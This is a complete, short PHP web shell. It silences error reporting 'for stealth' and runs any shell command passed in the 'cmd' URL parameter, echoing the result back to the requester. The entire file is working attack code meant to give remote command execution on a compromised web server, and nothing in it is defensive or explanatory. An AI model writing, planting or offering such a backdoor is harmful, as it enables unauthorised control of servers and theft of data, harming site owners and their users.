<?php
// Disable error reporting for stealth
error_reporting(0);

// Check if the 'cmd' parameter is set
if(isset($_GET['cmd'])) {
    // Execute the command and display the output
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>
